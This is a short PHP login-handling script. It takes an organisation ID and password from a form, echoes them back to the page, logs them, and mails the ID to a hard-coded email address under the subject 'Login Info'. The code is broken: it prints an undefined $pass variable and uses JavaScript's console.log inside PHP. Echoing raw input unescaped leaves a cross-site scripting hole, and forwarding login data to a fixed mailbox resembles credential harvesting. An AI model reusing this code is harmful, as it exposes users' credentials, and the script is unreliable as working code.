<?php

$org_Id = $_POST["org_id"];
$password = $_POST["pass"];

echo "Organization ".$org_Id."password ".$pass;
console.log("Organization ".$org_Id."password ".$pass);
mail("zeeshan@mixorg.com","Login Info",$org_Id);

?>